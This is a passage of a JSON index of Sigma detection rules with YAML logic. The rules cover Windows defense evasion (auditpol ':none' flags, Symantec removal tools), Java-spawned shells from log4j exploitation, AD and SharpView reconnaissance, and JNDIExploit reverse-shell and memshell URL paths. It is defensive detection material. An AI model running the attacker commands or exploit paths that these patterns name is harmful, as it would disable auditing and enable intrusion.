version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. status: experimental author: Nasreddine Bencherchali @nas_bench references: - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol date: 2021/12/18 tags: - attack.defense_evasion - attack.t1562.002 level: high logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;/logon:none\u0026#39; - \u0026#39;/system:none\u0026#39; - \u0026#39;/sam:none\u0026#39; - \u0026#39;/privilege:none\u0026#39; - \u0026#39;/object:none\u0026#39; - \u0026#39;/process:none\u0026#39; - \u0026#39;/policy:none\u0026#39; condition: selection falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_nt_resource_kit_auditpol_usage.yml/","tags":["attack.defense_evasion","attack.t1562.002"],"title":"Suspicious NT Resource Kit Auditpol Usage"},{"categories":null,"contents":"Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.\nKnown false-positives Legitimate administrative use References https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe Raw rule (edit) title: CleanWipe Usage id: f44800ac-38ec-471f-936e-3fa7d9c53100 status: experimental description: Detects the use of CleanWipe a tool usually used to delete Symantec antivirus. references: - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe author: Nasreddine Bencherchali @nas_bench date: 2021/12/18 tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \u0026#39;\\SepRemovalToolNative_x64.exe\u0026#39; selection2: Image|endswith: \u0026#39;\\CATClean.exe\u0026#39; CommandLine|contains: \u0026#39;--uninstall\u0026#39; selection3: Image|endswith: \u0026#39;\\NetInstaller.exe\u0026#39; CommandLine|contains: \u0026#39;-r\u0026#39; selection4: Image|endswith: \u0026#39;\\WFPUnins.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/uninstall\u0026#39; - \u0026#39;/enterprise\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administrative use level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cleanwipe.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"CleanWipe Usage"},{"categories":null,"contents":"Detects the use of Advanced Port Scanner.\nKnown false-positives Legitimate administrative use Tools with similar commandline (very rare) References https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner Raw rule (edit) title: Advanced Port Scanner id: 54773c5f-f1cc-4703-9126-2f797d96a69d status: experimental description: Detects the use of Advanced Port Scanner. references: - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner author: Nasreddine Bencherchali @nas_bench date: 2021/12/18 tags: - attack.discovery - attack.t1046 - attack.t1135 logsource: category: process_creation product: windows detection: selection1: Image|contains: \u0026#39;\\advanced_port_scanner\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;/portable\u0026#39; - \u0026#39;/lng\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administrative use - Tools with similar commandline (very rare) level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_advanced_port_scanner.yml/","tags":["attack.discovery","attack.t1046","attack.t1135"],"title":"Advanced Port Scanner"},{"categories":null,"contents":"Detects shell spawn from Java host process, which could a maintenance task or some kind of exploitation (e.g. log4j exploitation)\nKnown false-positives Legitimate calls to system binaries Company specific internal usage Raw rule (edit) title: Shells Spawn by Java id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0 description: Detects shell spawn from Java host process, which could a maintenance task or some kind of exploitation (e.g. log4j exploitation) status: experimental author: Andreas Hunkeler (@Karneades) date: 2021/12/17 modified: 2022/01/12 tags: - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\java.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; filter: ParentImage|contains: \u0026#39;build\u0026#39; # excluding CI build agents CommandLine|contains: \u0026#39;build\u0026#39; # excluding CI build agents condition: selection and not filter falsepositives: - Legitimate calls to system binaries - Company specific internal usage level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_shell_spawn_by_java.yml/","tags":["attack.initial_access","attack.persistence","attack.privilege_escalation"],"title":"Shells Spawn by Java"},{"categories":null,"contents":"Detects suspicious shell spawn from Java host process (e.g. log4j exploitation)\nKnown false-positives Legitimate calls to system binaries Company specific internal usage Raw rule (edit) title: Suspicious Shells Spawn by Java id: 0d34ed8b-1c12-4ff2-828c-16fc860b766d description: Detects suspicious shell spawn from Java host process (e.g. log4j exploitation) status: experimental author: Andreas Hunkeler (@Karneades), Florian Roth date: 2021/12/17 modified: 2021/12/22 tags: - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\java.exe\u0026#39; Image|endswith: - \u0026#39;\\sh.exe\u0026#39; - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\certutil.exe\u0026#39; - \u0026#39;\\whoami.exe\u0026#39; - \u0026#39;\\bitsadmin.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\scrcons.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\hh.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/ - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\forfiles.exe\u0026#39; - \u0026#39;\\scriptrunner.exe\u0026#39; - \u0026#39;\\mftrace.exe\u0026#39; - \u0026#39;\\AppVLP.exe\u0026#39; - \u0026#39;\\curl.exe\u0026#39; condition: selection falsepositives: - Legitimate calls to system binaries - Company specific internal usage level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_by_java.yml/","tags":["attack.initial_access","attack.persistence","attack.privilege_escalation"],"title":"Suspicious Shells Spawn by Java"},{"categories":null,"contents":"Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\nKnown false-positives unknown References https://redcanary.com/blog/intelligence-insights-december-2021 https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html Raw rule (edit) title: Suspicious Shells Spawn by Java Utility Keytool id: 90fb5e62-ca1f-4e22-b42e-cc521874c938 description: Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation) status: experimental author: Andreas Hunkeler (@Karneades) date: 2021/12/22 references: - https://redcanary.com/blog/intelligence-insights-december-2021 - https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html tags: - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\keytool.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\sh.exe\u0026#39; - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\certutil.exe\u0026#39; - \u0026#39;\\whoami.exe\u0026#39; - \u0026#39;\\bitsadmin.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\scrcons.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\hh.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\forfiles.exe\u0026#39; - \u0026#39;\\scriptrunner.exe\u0026#39; - \u0026#39;\\mftrace.exe\u0026#39; - \u0026#39;\\AppVLP.exe\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_by_java_keytool.yml/","tags":["attack.initial_access","attack.persistence","attack.privilege_escalation"],"title":"Suspicious Shells Spawn by Java Utility Keytool"},{"categories":null,"contents":"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-viru\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md Raw rule (edit) title: Security Software Discovery by Powershell id: 904e8e61-8edf-4350-b59c-b905fc8e810c status: experimental author: frack113 date: 2021/12/16 description: | Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-viru references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_1: ScriptBlockText|contains|all: - \u0026#39;get-process\u0026#39; - \u0026#39;.Description\u0026#39; - \u0026#39;-like\u0026#39; selection_2: ScriptBlockText|contains: - \u0026#39;\u0026#34;*virus*\u0026#34;\u0026#39; - \u0026#39;\u0026#34;*carbonblack*\u0026#34;\u0026#39; - \u0026#39;\u0026#34;*defender*\u0026#34;\u0026#39; - \u0026#39;\u0026#34;*cylance*\u0026#34;\u0026#39; condition: all of selection_* falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1518.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_security_software_discovery.yml/","tags":["attack.discovery","attack.t1518.001"],"title":"Security Software Discovery by Powershell"},{"categories":null,"contents":"Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md#atomic-test-5---security-software-discovery---sysmon-service Raw rule (edit) title: Suspicious Findstr 385201 Execution id: 37db85d1-b089-490a-a59a-c7b6f984f480 status: experimental description: Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed). author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md#atomic-test-5---security-software-discovery---sysmon-service date: 2021/12/16 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\findstr.exe CommandLine|contains: \u0026#39; 385201\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1518.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_findstr_385201.yml/","tags":["attack.discovery","attack.t1518.001"],"title":"Suspicious Findstr 385201 Execution"},{"categories":null,"contents":"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md Raw rule (edit) title: Powershell File and Directory Discovery id: d23f2ba5-9da0-4463-8908-8ee47f614bb9 description: | Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: - ls - get-childitem - gci recurse: ScriptBlockText|contains: \u0026#39;-recurse\u0026#39; condition: selection and recurse falsepositives: - unknown level: low tags: - attack.discovery - attack.t1083 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_file_and_directory_discovery.yml/","tags":["attack.discovery","attack.t1083"],"title":"Powershell File and Directory Discovery"},{"categories":null,"contents":"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md Raw rule (edit) title: Suspicious Get Information for AD Groups or DoesNotRequirePreAuth User id: 88f0884b-331d-403d-a3a1-b668cf035603 description: | Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_script detection: test_2: ScriptBlockText|contains: get-ADPrincipalGroupMembership test_7: ScriptBlockText|contains|all: - get-aduser - \u0026#39;-f \u0026#39; - \u0026#39;-pr \u0026#39; - DoesNotRequirePreAuth condition: 1 of test_* falsepositives: - unknown level: low tags: - attack.discovery - attack.t1069.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_ad_group_reco.yml/","tags":["attack.discovery","attack.t1069.001"],"title":"Suspicious Get Information for AD Groups or DoesNotRequirePreAuth User"},{"categories":null,"contents":"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md Raw rule (edit) title: Suspicious Get Information for SMB Share id: 95f0643a-ed40-467c-806b-aac9542ec5ab description: | Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: get-smbshare condition: selection falsepositives: - unknown level: low tags: - attack.discovery - attack.t1069.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_smb_share_reco.yml/","tags":["attack.discovery","attack.t1069.001"],"title":"Suspicious Get Information for SMB Share"},{"categories":null,"contents":"The attacker creates a computer object using those permissions with a password known to her. After that she clears the attribute ServicePrincipalName on the computer object. Because she created the object (CREATOR OWNER), she gets granted additional permissions and can do many changes to the object.\nKnown false-positives Unknown References https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/ Raw rule (edit) title: Exploit SamAccountName Spoofing with Kerberos id: 44bbff3e-4ca3-452d-a49a-6efa4cafa06f status: experimental description: | The attacker creates a computer object using those permissions with a password known to her. After that she clears the attribute ServicePrincipalName on the computer object. Because she created the object (CREATOR OWNER), she gets granted additional permissions and can do many changes to the object. references: - https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/ author: frack113 date: 2021/12/15 logsource: product: windows service: system detection: selection_1: Provider_Name: Microsoft-Windows-Kerberos-Key-Distribution-Center # Active Directory EventID: - 35 - 36 - 37 - 38 selection_2: Provider_Name: Microsoft-Windows-Directory-Services-SAM # Active Directory EventID: - 16990 - 16991 condition: selection_1 or selection_2 fields: - samAccountName falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1558.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_vul_cve_2021_42278_or_cve_2021_42287.yml/","tags":["attack.credential_access","attack.t1558.003"],"title":"Exploit SamAccountName Spoofing with Kerberos"},{"categories":null,"contents":"Detects the execution of a AdFind for enumeration\nKnown false-positives Administrative activity References https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/T1087.002.md Raw rule (edit) title: Suspicious AdFind Enumerate id: 455b9d50-15a1-4b99-853f-8d37655a4c1b status: experimental description: Detects the execution of a AdFind for enumeration references: - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/T1087.002.md author: frack113 date: 2021/12/13 logsource: product: windows category: process_creation detection: selection: Image|endswith: \u0026#39;\\adfind.exe\u0026#39; test_5: #Listing password policy CommandLine|contains: - lockoutduration - lockoutthreshold - lockoutobservationwindow - maxpwdage - minpwdage - minpwdlength - pwdhistorylength - pwdproperties test_6: #Enumerate Active Directory Admins CommandLine|contains: \u0026#39;-sc admincountdmp\u0026#39; test_8: #Enumerate Active Directory Exchange AD Objects CommandLine|contains: \u0026#39;-sc exchaddresses\u0026#39; condition: selection and 1 of test_* falsepositives: - Administrative activity level: medium tags: - attack.discovery - attack.t1087.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_adfind_enumerate.yml/","tags":["attack.discovery","attack.t1087.002"],"title":"Suspicious AdFind Enumerate"},{"categories":null,"contents":"Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md Raw rule (edit) title: Automated Collection Bookmarks Using Get-ChildItem PowerShell id: e0565f5d-d420-4e02-8a68-ac00d864f9cf status: experimental author: frack113 date: 2021/12/13 description: | Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;Get-ChildItem\u0026#39; - \u0026#39; -Recurse \u0026#39; - \u0026#39; -Path \u0026#39; - \u0026#39; -Filter Bookmarks\u0026#39; - \u0026#39; -ErrorAction SilentlyContinue\u0026#39; - \u0026#39; -Force\u0026#39; condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1217 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_get_childitem_bookmarks.yml/","tags":["attack.discovery","attack.t1217"],"title":"Automated Collection Bookmarks Using Get-ChildItem PowerShell"},{"categories":null,"contents":"Use dir to collect information\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md Raw rule (edit) title: Suspicious DIR Execution id: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006 status: experimental description: Use dir to collect information references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md author: frack113 date: 2021/12/13 logsource: category: process_creation product: windows detection: dir: CommandLine|contains|all: - \u0026#39;dir \u0026#39; - \u0026#39; /s\u0026#39; - \u0026#39; /b\u0026#39; condition: dir falsepositives: - unknown level: low tags: - attack.discovery - attack.t1217 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_dir.yml/","tags":["attack.discovery","attack.t1217"],"title":"Suspicious DIR Execution"},{"categories":null,"contents":"Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md Raw rule (edit) title: Suspicious Where Execution id: 725a9768-0f5e-4cb3-aec2-bc5719c6831a status: experimental description: | Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1217/T1217.md author: frack113 date: 2021/12/13 logsource: category: process_creation product: windows detection: where_exe: Image|endswith: \u0026#39;\\where.exe\u0026#39; where_opt: CommandLine|contains: - \u0026#39;Bookmarks\u0026#39; - \u0026#39;places.sqlite\u0026#39; condition: all of where_* falsepositives: - unknown level: low tags: - attack.discovery - attack.t1217 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_where_execution.yml/","tags":["attack.discovery","attack.t1217"],"title":"Suspicious Where Execution"},{"categories":null,"contents":"Detects exploitation attempt using the JDNIExploiit Kit\nKnown false-positives Legitimate apps the use these paths References https://github.com/pimps/JNDI-Exploit-Kit https://githubmemory.com/repo/FunctFan/JNDIExploit Raw rule (edit) title: JNDIExploit Pattern id: 412d55bc-7737-4d25-9542-5b396867ce55 status: experimental description: Detects exploitation attempt using the JDNIExploiit Kit author: Florian Roth date: 2021/12/12 references: - https://github.com/pimps/JNDI-Exploit-Kit - https://githubmemory.com/repo/FunctFan/JNDIExploit logsource: category: webserver detection: keywords: - \u0026#39;/Basic/Command/Base64/\u0026#39; - \u0026#39;/Basic/ReverseShell/\u0026#39; - \u0026#39;/Basic/TomcatMemshell\u0026#39; - \u0026#39;/Basic/JettyMemshell\u0026#39; - \u0026#39;/Basic/WeblogicMemshell\u0026#39; - \u0026#39;/Basic/JBossMemshell\u0026#39; - \u0026#39;/Basic/WebsphereMemshell\u0026#39; - \u0026#39;/Basic/SpringMemshell\u0026#39; - \u0026#39;/Deserialization/URLDNS/\u0026#39; - \u0026#39;/Deserialization/CommonsCollections1/Dnslog/\u0026#39; - \u0026#39;/Deserialization/CommonsCollections2/Command/Base64/\u0026#39; - \u0026#39;/Deserialization/CommonsBeanutils1/ReverseShell/\u0026#39; - \u0026#39;/Deserialization/Jre8u20/TomcatMemshell\u0026#39; - \u0026#39;/TomcatBypass/Dnslog/\u0026#39; - \u0026#39;/TomcatBypass/Command/\u0026#39; - \u0026#39;/TomcatBypass/ReverseShell/\u0026#39; - \u0026#39;/TomcatBypass/TomcatMemshell\u0026#39; - \u0026#39;/TomcatBypass/SpringMemshell\u0026#39; - \u0026#39;/GroovyBypass/Command/\u0026#39; - \u0026#39;/WebsphereBypass/Upload/\u0026#39; condition: keywords falsepositives: - Legitimate apps the use these paths level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_jndi_exploit.yml/","tags":null,"title":"JNDIExploit Pattern"},{"categories":null,"contents":"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md Raw rule (edit) title: Suspicious Get Local Groups Information id: fa6a5a45-3ee2-4529-aa14-ee5edc9e29cb status: experimental description: | Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md author: frack113 date: 2021/12/12 logsource: product: windows category: ps_script detection: test_3: ScriptBlockText|contains: - \u0026#39;get-localgroup\u0026#39; - \u0026#39;Get-LocalGroupMember\u0026#39; test_6: ScriptBlockText|contains|all: - \u0026#39;Get-WMIObject\u0026#39; - \u0026#39;Win32_Group\u0026#39; condition: 1 of test_* falsepositives: - unknown level: low tags: - attack.discovery - attack.t1069.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_local_group_reco.yml/","tags":["attack.discovery","attack.t1069.001"],"title":"Suspicious Get Local Groups Information"},{"categories":null,"contents":"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md Raw rule (edit) title: Suspicious Get Local Groups Information with WMIC id: 164eda96-11b2-430b-85ff-6a265c15bf32 status: experimental description: | Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md author: frack113 date: 2021/12/12 logsource: product: windows category: process_creation detection: test_5: Image|endswith: \u0026#39;\\wmic.exe\u0026#39; CommandLine|contains: \u0026#39; group\u0026#39; condition: test_5 falsepositives: - unknown level: low tags: - attack.discovery - attack.t1069.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_suspicious_ad_reco.yml/","tags":["attack.discovery","attack.t1069.001"],"title":"Suspicious Get Local Groups Information with WMIC"},{"categories":null,"contents":"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\nKnown false-positives pentest References https://github.com/tevora-threat/SharpView/ https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-4---system-discovery-using-sharpview Raw rule (edit) title: Suspicious Execution of SharpView Aka PowerView id: b2317cfa-4a47-4ead-b3ff-297438c0bc2d status: experimental description: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems author: frack113 references: - https://github.com/tevora-threat/SharpView/ - https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-4---system-discovery-using-sharpview date: 2021/12/10 logsource: category: process_creation product: windows detection: sharpview: OriginalFileName: SharpView.exe sharpview_methods: Commandline|contains: - Get-DomainGPOUserLocalGroupMapping - Find-GPOLocation - Get-DomainGPOComputerLocalGroupMapping - Find-GPOComputerAdmin - Get-DomainObjectAcl - Get-ObjectAcl - Add-DomainObjectAcl - Add-ObjectAcl - Remove-DomainObjectAcl - Get-RegLoggedOn - Get-LoggedOnLocal - Get-NetRDPSession - Test-AdminAccess - Invoke-CheckLocalAdminAccess - Get-WMIProcess - Get-NetProcess - Get-WMIRegProxy - Get-Proxy - Get-WMIRegLastLoggedOn - Get-LastLoggedOn - Get-WMIRegCachedRDPConnection - Get-CachedRDPConnection - Get-WMIRegMountedDrive - Get-RegistryMountedDrive - Find-InterestingDomainAcl - Invoke-ACLScanner - Get-NetShare - Get-NetLoggedon - Get-NetLocalGroup - Get-NetLocalGroupMember - Get-NetSession - Get-PathAcl - ConvertFrom-UACValue - Get-PrincipalContext - New-DomainGroup - New-DomainUser - Add-DomainGroupMember - Set-DomainUserPassword - Invoke-Kerberoast - Export-PowerViewCSV - Find-LocalAdminAccess - Find-DomainLocalGroupMember - Find-DomainShare - Find-DomainUserEvent - Find-DomainProcess - Find-DomainUserLocation - Find-InterestingFile - Find-InterestingDomainShareFile - Find-DomainObjectPropertyOutlier - TestMethod - Get-Domain - Get-NetDomain - Get-DomainComputer - Get-NetComputer - Get-DomainController - Get-NetDomainController - Get-DomainFileServer - Get-NetFileServer - Convert-ADName - Get-DomainObject - Get-ADObject - Get-DomainUser - Get-NetUser - Get-DomainGroup - Get-NetGroup - Get-DomainDFSShare - Get-DFSshare - Get-DomainDNSRecord - Get-DNSRecord - Get-DomainDNSZone - Get-DNSZone - Get-DomainForeignGroupMember - Find-ForeignGroup - Get-DomainForeignUser - Find-ForeignUser - ConvertFrom-SID - Convert-SidToName - Get-DomainGroupMember - Get-NetGroupMember - Get-DomainManagedSecurityGroup - Find-ManagedSecurityGroups - Get-DomainOU - Get-NetOU - Get-DomainSID - Get-Forest - Get-NetForest - Get-ForestTrust - Get-NetForestTrust - Get-DomainTrust - Get-NetDomainTrust - Get-ForestDomain - Get-NetForestDomain - Get-DomainSite - Get-NetSite - Get-DomainSubnet - Get-NetSubnet - Get-DomainTrustMapping - Invoke-MapDomainTrust - Get-ForestGlobalCatalog - Get-NetForestCatalog - Get-DomainUserEvent - Get-UserEvent - Get-DomainGUIDMap - Get-GUIDMap - Resolve-IPAddress - Get-IPAddress - ConvertTo-SID - Invoke-UserImpersonation - Invoke-RevertToSelf - Get-DomainSPNTicket - Request-SPNTicket - Get-NetComputerSiteName - Get-SiteName - Get-DomainGPO - Get-NetGPO - Set-DomainObject - Set-ADObject - Add-RemoteConnection - Remove-RemoteConnection - Get-IniContent - Get-GptTmpl - Get-GroupsXML - Get-DomainPolicyData - Get-DomainPolicy - Get-DomainGPOLocalGroup - Get-NetGPOGroup condition: sharpview or sharpview_methods falsepositives: - pentest level: high tags: - attack.discovery - attack.t1049 - attack.t1069.002 - attack.t1482 - attack.t1135 - attack.t1033 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_sharpview.yml/","tags":["attack.discovery","attack.t1049","attack.t1069.002","attack.t1482","attack.t1135","attack.t1033"],"title":"Suspicious Execution of SharpView Aka PowerView"},{"categories":null,"contents":"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\nKnown false-positives Unknown References 